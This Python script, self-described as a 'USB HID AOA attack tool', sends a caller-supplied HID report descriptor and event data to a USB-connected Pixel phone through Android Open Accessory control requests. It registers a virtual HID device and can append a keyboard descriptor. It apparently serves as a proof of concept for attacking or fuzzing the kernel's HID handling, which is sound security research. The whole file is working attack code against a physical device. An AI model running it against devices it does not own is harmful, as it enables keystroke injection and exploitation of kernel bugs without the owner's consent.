# SPDX-License-Identifier: GPL-2.0
"""A tool to send HID report descriptor and HID event data to Android device via AOA protocol."""

import argparse
import io
import struct
import time

import hexdump
import usb

ATTACK_HID_ID = 18

USB_OUT_VENDOR_CTRL_REQ_TYPE = 0x40

AOA_REGISTER_HID_CTRL_REQ = 54
AOA_SEND_HID_REPORT_DESCR_CTRL_REQ = 56
AOA_SEND_HID_EVENT_CTRL_REQ = 57

# http://www.linux-usb.org/usb.ids
PIXEL_VID = 0x18d1
PIXEL_PIDS = (
    0x4ee1, # MTP
    0x4ee2, # MTP + debug
    0x4ee3, # tether
    0x4ee4, # tether + debug
    0x4ee5, # PTP
    0x4ee6, # PTP + debug
    0x4ee7, # charging + debug
    0x4ee5, # MIDI
    0x4ee6, # MIDI + debug
)

# HID report descriptor for keyboard
KBRD_HID_DESCRIPTOR = (
    b'\x05\x01\x09\x06\xA1\x01\x85\x01\x05\x07\x75\x01\x95\x08\x19'
    b'\xE0\x29\xE7\x15\x00\x25\x01\x81\x02\x95\x03\x75\x08\x15\x00'
    b'\x25\x64\x05\x07\x19\x00\x29\x65\x81\x00\xC0\x05\x0C\x09\x01'
    b'\xA1\x01\x85\x02\x05\x0C\x15\x00\x25\x01\x75\x01\x95\x07\x09'
    b'\xB5\x09\xB6\x09\xB7\x09\xB8\x09\xCD\x09\xE2\x09\xE9\x09\xEA'
    b'\x81\x02\xC0')


def get_pixel_device():
  for bus in usb.busses():
    for device in bus.devices:
      if device.idProduct in PIXEL_PIDS and \
          device.idVendor == PIXEL_VID:
        return device.open()

  return None


def get_default_descriptor_and_input_data():
  """Returns a default HID report descript and event data."""

  default_report_descriptor = (
      b'\x05\x01\x09\x06\xA1\x01\x05\x07\x19\xE0\x29\xE7\x15\x00\x25\x01'
      b'\x75\x01\x95\x08\x81\x02\x95\x01\x75\x08\x81\x01\x19\x00\x29\x65'
      b'\x15\x00\x25\x65\x75\x08\x95\x01\x81\x00\xC0'
  )

  default_report_data = bytes([x for x in range(0x20, 0x30)])

  default_vid = 0x610b
  default_pid = 0x4653

  return struct.pack('BBxxHH',
                     len(default_report_descriptor),
                     len(default_report_data),
                     default_vid, default_pid) + \
                     default_report_descriptor + \
                     default_report_data


def init_args():
  """Initialize and parse input arguments."""

  default_hid_data = get_default_descriptor_and_input_data()

  parser = argparse.ArgumentParser(description='USB HID AOA attack tool.')
  parser.add_argument(
      '--data',
      type=argparse.FileType('rb', 0),
      help='HID report descriptor and input data',
      default=io.BytesIO(default_hid_data))
  parser.add_argument(
      '--append_kbrd',
      type=bool,
      help='Append keyboard HID report descriptor',
      default=False)
  parser.add_argument(
      '--ignore_event',
      type=bool,
      help='Do not send HID event',
      default=False)

  return parser.parse_args()


def main():
  args = init_args()
  data = args.data.read()

  if len(data) <= 8:
    print('Invalid format of HID data.')
    return

  (desc_sz, input_sz, unused_vid, unused_pid) = \
      struct.unpack_from('BBxxHH', data, 0)
  if desc_sz > 255:
    desc_sz = 255

  desc_data = data[8: 8 + desc_sz]
  if input_sz > 255:
    input_sz = 255

  # Append a legitimate HID keyboard descriptor if necessary
  # otherwise the HID device might not be registered in the system
  # and sending HID event won't work
  input_data = data[8 + desc_sz: 8 + desc_sz + input_sz]
  if args.append_kbrd:
    desc_data += KBRD_HID_DESCRIPTOR

  # when sending HID descriptor and event via AOA protocol
  # VID and PID aren't relevant

  print(f'HID_ID = {ATTACK_HID_ID:04X}')
  print(f'RDESC: size={len(desc_data)}')
  hexdump.hexdump(desc_data)

  print(f'INPUT: size={len(input_data)}')
  hexdump.hexdump(input_data)

  pixel_device = get_pixel_device()
  if pixel_device is None:
    print('No pixel device connected to USB bus.')
    return

  print('Registering HID device')
  pixel_device.controlMsg(USB_OUT_VENDOR_CTRL_REQ_TYPE,
                          AOA_REGISTER_HID_CTRL_REQ,
                          None, ATTACK_HID_ID, len(desc_data))

  print('Sending HID report descriptor')
  pixel_device.controlMsg(USB_OUT_VENDOR_CTRL_REQ_TYPE,
                          AOA_SEND_HID_REPORT_DESCR_CTRL_REQ,
                          desc_data, ATTACK_HID_ID, 0)
  # Processing of HID report descriptor happens assynchroniously in kernel.
  time.sleep(0.1)

  if not args.ignore_event:
    print('Sending HID event')
    pixel_device.controlMsg(USB_OUT_VENDOR_CTRL_REQ_TYPE,
                            AOA_SEND_HID_EVENT_CTRL_REQ,
                            input_data, ATTACK_HID_ID, 0)

if __name__ == '__main__':
  main()
